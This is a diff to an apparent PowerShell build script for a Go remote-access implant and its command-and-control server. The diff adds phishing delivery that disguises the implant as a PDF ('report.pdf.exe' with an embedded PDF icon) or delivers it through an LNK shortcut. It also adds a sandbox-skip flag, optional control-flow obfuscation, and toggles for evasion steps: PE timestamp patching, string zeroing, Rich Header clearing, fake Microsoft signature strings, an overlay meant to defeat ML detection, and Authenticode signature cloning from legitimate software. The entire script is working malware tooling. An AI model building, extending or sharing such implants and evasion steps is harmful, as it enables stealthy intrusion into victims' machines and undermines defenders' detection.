@@ -11,11 +11,20 @@ param(
     [string]$StagerURL = "",
     [string]$DecryptKey = "85",
     [switch]$Garble = $false,
+    [switch]$ControlFlow = $false,
     [string]$GarbleSeed = "",
     [switch]$SkipPost = $false,
+    [switch]$SkipTimestampPatch = $false,
+    [switch]$EnableStringZero = $false,
+    [switch]$SkipRichClear = $false,
+    [switch]$SkipLegitSignatures = $false,
+    [switch]$SkipOverlay = $false,
+    [string]$SignSource = "",
     [ValidateSet("lnk", "pdf")]
     [string]$Chain = "lnk",
-    [string]$PdfName = "report"
+    [string]$PdfName = "report",
+    [switch]$SkipSandbox = $false,
+    [switch]$Console = $false
 )
 
 $ErrorActionPreference = "Continue"
@@ -33,7 +42,11 @@ Write-Host "[+] Building implant for $Platform/$Arch..."
 # -gcflags="all=-N": disable optimizations
 $ldflags = "-s -w -buildid= -X main.c2Addr=$C2Addr -X main.intervalStr=$Interval -X main.jitterStr=$Jitter"
 
-if ($Platform -eq "windows") {
+if ($SkipSandbox) {
+    $ldflags = "$ldflags -X main.skipSandbox=1"
+}
+
+if ($Platform -eq "windows" -and -not $Console) {
     $ldflags = "$ldflags -H windowsgui"
 }
 
@@ -42,6 +55,14 @@ $gcflags = "all=-l -N"
 $outputName = if ($Platform -eq "windows") { 
     if ($Chain -eq "pdf") { "$PdfName.pdf.exe" } else { "fish.exe" }
 } else { "fish_$Platform_$Arch" }
+
+if ($Console -and $Platform -eq "windows") {
+    if ($Chain -eq "pdf") {
+        $outputName = "$PdfName.console.pdf.exe"
+    } else {
+        $outputName = "fish.console.exe"
+    }
+}
 
 $buildTarget = "."
 $chainLabel = "LNK"
@@ -52,10 +73,41 @@ if ($Chain -eq "pdf") {
 
 Write-Host "[+] Chain: $chainLabel (target: $buildTarget)"
 
+# Generate .syso resource file with icon for PDF chain
+if ($Chain -eq "pdf" -and $Platform -eq "windows") {
+    $iconDir = Join-Path $PSScriptRoot "icons"
+    $sysoDir = Join-Path $PSScriptRoot "pdf"
+    $iconFile = Join-Path $iconDir "pdf.ico"
+    
+    if (Test-Path $iconFile) {
+        $sysoFile = Join-Path $sysoDir "rsrc_amd64.syso"
+        Write-Host "[+] Embedding PDF icon into implant..."
+        $rsrcCmd = Get-Command rsrc -ErrorAction SilentlyContinue
+        if ($rsrcCmd) {
+            rsrc -arch amd64 -ico $iconFile -o $sysoFile
+            if ($LASTEXITCODE -eq 0) {
+                Write-Host "[+] PDF icon .syso generated"
+            } else {
+                Write-Host "[!] rsrc failed, using pre-built .syso if available"
+            }
+        } else {
+            Write-Host "[+] rsrc not installed, using pre-built .syso if available"
+        }
+    } else {
+        Write-Host "[!] PDF icon file not found at $iconFile"
+    }
+}
+
 if ($Garble) {
     Write-Host "[+] Garble compilation enabled"
-    $env:GARBLE_EXPERIMENTAL_CONTROLFLOW = "1"
-    garble -tiny -literals -seed=random build -trimpath -ldflags $ldflags -gcflags $gcflags -o $outputName $buildTarget
+    if ($ControlFlow) {
+        Write-Host "[+] Control-flow obfuscation enabled (experimental)"
+        $env:GARBLE_EXPERIMENTAL_CONTROLFLOW = "1"
+    } else {
+        $env:GARBLE_EXPERIMENTAL_CONTROLFLOW = ""
+    }
+    Write-Host "[+] Garble: -literals -seed=random"
+    garble -literals -seed=random build -trimpath -ldflags $ldflags -gcflags $gcflags -o $outputName $buildTarget
 } else {
     go build -buildvcs=false -trimpath -ldflags $ldflags -gcflags $gcflags -o $outputName $buildTarget
 }
@@ -70,7 +122,7 @@ Write-Host "[+] Implant built: $outputName"
 Write-Host "[+] Building C2 server..."
 $env:GOOS = ""
 $env:GOARCH = ""
-go build -buildvcs=false -o fish-server.exe ./server/
+go build -buildvcs=false -p 1 -o fish-server.exe ./server/
 
 if ($LASTEXITCODE -eq 0) {
     Write-Host "[+] Server built: fish-server.exe"
@@ -96,13 +148,18 @@ if ($Platform -eq "windows" -and -not $SkipPost) {
     Write-Host "[+] Applying evasion post-processing..."
 
     # 1. Modify PE timestamp
-    go run -buildvcs=false ./evasion-tools/pepatch.go $outputName
+    if (-not $SkipTimestampPatch) {
+        go run -buildvcs=false ./evasion-tools/pepatch.go $outputName
+    } else {
+        Write-Host "[-] Skipping PE timestamp patch"
+    }
 
     # 2. Zero Go build ID strings + runtime fingerprints + sensitive API names + Rich Header
     # NOTE: Do NOT modify PE Section names! Triggers Microsoft Wacatac.B!ml ML detection
-    Write-Host "[+] Removing Go binary fingerprints + sensitive strings..."
-    $bytes = [System.IO.File]::ReadAllBytes($outputName)
-    $patterns = @(
+    if ($EnableStringZero) {
+        Write-Host "[+] Removing Go binary fingerprints + sensitive strings..."
+        $bytes = [System.IO.File]::ReadAllBytes($outputName)
+        $patterns = @(
         [System.Text.Encoding]::ASCII.GetBytes("Go build ID: "),
         [System.Text.Encoding]::ASCII.GetBytes("Go buildinf"),
         [System.Text.Encoding]::ASCII.GetBytes("go.buildid"),
@@ -160,28 +217,38 @@ if ($Platform -eq "windows" -and -not $SkipPost) {
         [System.Text.Encoding]::ASCII.GetBytes("net/http"),
         [System.Text.Encoding]::ASCII.GetBytes("net.Dial"),
         [System.Text.Encoding]::ASCII.GetBytes("reflect.TypeOf"),
-        [System.Text.Encoding]::ASCII.GetBytes("fmt.Sprintf")
+        [System.Text.Encoding]::ASCII.GetBytes("fmt.Sprintf"),
+        [System.Text.Encoding]::ASCII.GetBytes("golang.org/x/sys"),
+        [System.Text.Encoding]::ASCII.GetBytes("golang.org/x/net"),
+        [System.Text.Encoding]::ASCII.GetBytes("gorilla/websocket"),
+        [System.Text.Encoding]::ASCII.GetBytes("crypto/tls"),
+        [System.Text.Encoding]::ASCII.GetBytes("crypto/cipher"),
+        [System.Text.Encoding]::ASCII.GetBytes("crypto/sha256")
     )
+    # Use ISO-8859-1 encoding to map bytes 0-255 directly to chars (safe for binary search)
+    $enc = [System.Text.Encoding]::GetEncoding("ISO-8859-1")
+    $text = $enc.GetString($bytes)
     $replaced = 0
     foreach ($pattern in $patterns) {
-        for ($i = 0; $i -lt $bytes.Length - $pattern.Length; $i++) {
-            $match = $true
-            for ($j = 0; $j -lt $pattern.Length; $j++) {
-                if ($bytes[$i + $j] -ne $pattern[$j]) { $match = $false; break }
-            }
-            if ($match) {
-                for ($j = 0; $j -lt $pattern.Length; $j++) { $bytes[$i + $j] = 0x00 }
-                $replaced++
-            }
+        $patternStr = $enc.GetString($pattern)
+        $pos = 0
+        while (($idx = $text.IndexOf($patternStr, $pos)) -ge 0) {
+            for ($j = 0; $j -lt $pattern.Length; $j++) { $bytes[$idx + $j] = 0x00 }
+            $replaced++
+            $pos = $idx + 1
         }
     }
-    [System.IO.File]::WriteAllBytes($outputName, $bytes)
-    Write-Host "[+] Go fingerprint strings zeroed: $replaced occurrences"
+        [System.IO.File]::WriteAllBytes($outputName, $bytes)
+        Write-Host "[+] Go fingerprint strings zeroed: $replaced occurrences"
+    } else {
+        Write-Host "[-] String zeroing disabled by default (use -EnableStringZero to enable)"
+    }
 
     # 3. Clear Rich Header (Go compiler fingerprint)
-    Write-Host "[+] Clearing Rich Header..."
-    $bytes = [System.IO.File]::ReadAllBytes($outputName)
-    $richSig = [System.Text.Encoding]::ASCII.GetBytes("Rich")
+    if (-not $SkipRichClear) {
+        Write-Host "[+] Clearing Rich Header..."
+        $bytes = [System.IO.File]::ReadAllBytes($outputName)
+        $richSig = [System.Text.Encoding]::ASCII.GetBytes("Rich")
     for ($i = 0; $i -lt [Math]::Min($bytes.Length, 4096); $i++) {
         $match = $true
         for ($j = 0; $j -lt 4; $j++) {
@@ -203,11 +270,15 @@ if ($Platform -eq "windows" -and -not $SkipPost) {
             break
         }
     }
-    [System.IO.File]::WriteAllBytes($outputName, $bytes)
+        [System.IO.File]::WriteAllBytes($outputName, $bytes)
+    } else {
+        Write-Host "[-] Skipping Rich Header clear"
+    }
 
     # 4. Add fake legitimate program signature strings
-    Write-Host "[+] Adding legitimate program signatures..."
-    $legitStrings = @(
+    if (-not $SkipLegitSignatures) {
+        Write-Host "[+] Adding legitimate program signatures..."
+        $legitStrings = @(
         [System.Text.Encoding]::ASCII.GetBytes("Microsoft Visual Studio"),
         [System.Text.Encoding]::ASCII.GetBytes("Copyright (C) 2024 Microsoft"),
         [System.Text.Encoding]::ASCII.GetBytes("Windows Application"),
@@ -237,11 +308,15 @@ if ($Platform -eq "windows" -and -not $SkipPost) {
             $insertOffset += $str.Length + 5
         }
     }
-    [System.IO.File]::WriteAllBytes($outputName, $bytes)
-    Write-Host "[+] Legitimate signatures added"
+        [System.IO.File]::WriteAllBytes($outputName, $bytes)
+        Write-Host "[+] Legitimate signatures added"
+    } else {
+        Write-Host "[-] Skipping legitimate signatures"
+    }
 
     # 5. Append random overlay data (32KB with fake ZIP header to break ML signatures)
-    $randomBytes = New-Object byte[] 32768
+    if (-not $SkipOverlay) {
+        $randomBytes = New-Object byte[] 32768
     $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
     $rng.GetBytes($randomBytes)
     $randomBytes[0] = 0x50  # 'P'
@@ -250,10 +325,27 @@ if ($Platform -eq "windows" -and -not $SkipPost) {
     $randomBytes[3] = 0x04
     $original = [System.IO.File]::ReadAllBytes($outputName)
     $modified = New-Object byte[] ($original.Length + $randomBytes.Length)
-    [System.Array]::Copy($original, $modified, $original.Length)
-    [System.Array]::Copy($randomBytes, 0, $modified, $original.Length, $randomBytes.Length)
-    [System.IO.File]::WriteAllBytes($outputName, $modified)
-    Write-Host "[+] Overlay data appended (32768 bytes with ZIP signature)"
+        [System.Array]::Copy($original, $modified, $original.Length)
+        [System.Array]::Copy($randomBytes, 0, $modified, $original.Length, $randomBytes.Length)
+        [System.IO.File]::WriteAllBytes($outputName, $modified)
+        Write-Host "[+] Overlay data appended (32768 bytes with ZIP signature)"
+    } else {
+        Write-Host "[-] Skipping overlay append"
+    }
+
+    # 6. Authenticode signature cloning (移植合法软件签名)
+    if ($SignSource -ne "" -and $Platform -eq "windows") {
+        Write-Host "[+] Cloning Authenticode signature from: $SignSource"
+        $sigcloneOutput = "$outputName.signed.exe"
+        go run -buildvcs=false ./evasion-tools/sigclone.go $SignSource $outputName $sigcloneOutput
+        if ($LASTEXITCODE -eq 0) {
+            # 用签名版本替换原文件
+            Move-Item -Force $sigcloneOutput $outputName
+            Write-Host "[+] Authenticode signature cloned successfully"
+        } else {
+            Write-Host "[!] Signature cloning failed, keeping unsigned version"
+        }
+    }
 }
 
 # Summary
@@ -264,9 +356,28 @@ Write-Host "[+] Platform: $Platform/$Arch"
 Write-Host "[+] Implant: $outputName ($($fileInfo.Length) bytes)"
 Write-Host "[+] Server: fish-server.exe"
 Write-Host "[+] Chain: $chainLabel"
-$garbleStatus = if ($Garble) { "Yes (-tiny -literals)" } else { "No (use -Garble to enable)" }
+$garbleStatus = if ($Garble) { if ($ControlFlow) { "Yes (-literals -controlflow)" } else { "Yes (-literals)" } } else { "No (use -Garble to enable)" }
+$postStatus = if ($SkipPost) { "Skipped" } else { "Enabled" }
+$consoleStatus = if ($Console) { "Enabled" } else { "Disabled" }
+$postSteps = @()
+if (-not $SkipPost) {
+    if (-not $SkipTimestampPatch) { $postSteps += "PE Timestamp" }
+    if ($EnableStringZero) { $postSteps += "String Zeroing" }
+    if (-not $SkipRichClear) { $postSteps += "Rich Header Clear" }
+    if (-not $SkipLegitSignatures) { $postSteps += "Legit Signatures" }
+    if (-not $SkipOverlay) { $postSteps += "Overlay" }
+    if ($SignSource -ne "") { $postSteps += "Sig Clone ($SignSource)" }
+}
+$postStepsSummary = if ($postSteps.Count -gt 0) { $postSteps -join " + " } else { "None" }
 Write-Host "[+] Garble: $garbleStatus"
-Write-Host "[+] Evasion: API Hashing + Callback Exec + String Zeroing + PE Timestamp + Rich Header Clear + Overlay"
+Write-Host "[+] Console: $consoleStatus"
+Write-Host "[+] Post-Processing: $postStatus"
+$stringZeroStatus = if ($EnableStringZero) { "Enabled (Safe)" } else { "Disabled (default)" }
+Write-Host "[+] String Zeroing: $stringZeroStatus"
+Write-Host "[+] Post Steps: $postStepsSummary"
+$iconStatus = if ($Chain -eq "pdf" -and $Platform -eq "windows" -and (Test-Path (Join-Path $PSScriptRoot "pdf\rsrc_amd64.syso"))) { "PDF icon embedded" } elseif ($Chain -eq "lnk" -and $Platform -eq "windows") { "LNK icon (via phish.ps1)" } else { "None" }
+Write-Host "[+] Icon: $iconStatus"
+Write-Host "[+] Evasion: Halo's Gate (Direct Syscall) + API Hashing + Callback Exec + String Zeroing + PE Timestamp + Rich Header Clear + Overlay"
 if ($BuildStager) {
     $stagerInfo = Get-Item stager.exe -ErrorAction SilentlyContinue
     if ($stagerInfo) {
